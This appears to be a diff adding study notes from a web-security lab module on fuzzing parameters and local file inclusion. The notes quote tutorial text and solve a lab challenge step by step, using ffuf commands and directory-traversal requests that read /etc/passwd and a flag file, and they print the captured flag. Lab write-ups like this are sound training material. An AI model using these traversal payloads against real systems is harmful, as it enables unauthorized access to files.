@@ -1,1 +1,28 @@
+Fuzzing Parameters
+The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.
 
+The Attacking Web Applications with Ffuf module goes into details on how we can fuzz for GET/POST parameters. For example, we can fuzz the page for common GET parameters, as follows:
+
+ffuf example: ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+
+LFI wordlists
+So far in this module, we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise, as discussed earlier. However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.
+
+There are a number of LFI Wordlists we can use for this scan. A good wordlist is LFI-Jhaddix.txt, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module, as follows:
+
+FFuF example: ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+
+CHALLENGE: 94.237.54.116:43459
+
+Question 1 - Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
+
+1) ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.54.116:43459/index.php?FUZZ=key'
+2) ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.54.116:43459/index.php?FUZZ=key' -fs 2309 
+output: view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 78ms]
+3) ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.116:43459/index.php?view=FUZZ'
+4) ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.116:43459/index.php?view=FUZZ' -fs 1935 
+we recieve a lot of output so we will just start tryuing some 
+5) http://94.237.54.116:43459/index.php?view=../../../../../../../../../../../../../../../../../../../../etc/passwd -> this worked so replace /etc with ../ for 
+6) http://94.237.54.116:43459/index.php?view=../../../../../../../../../../../../../../../../../../../../../flag.txt -> HTB{4u70m47!0n_f!nd5_#!dd3n_93m5} 
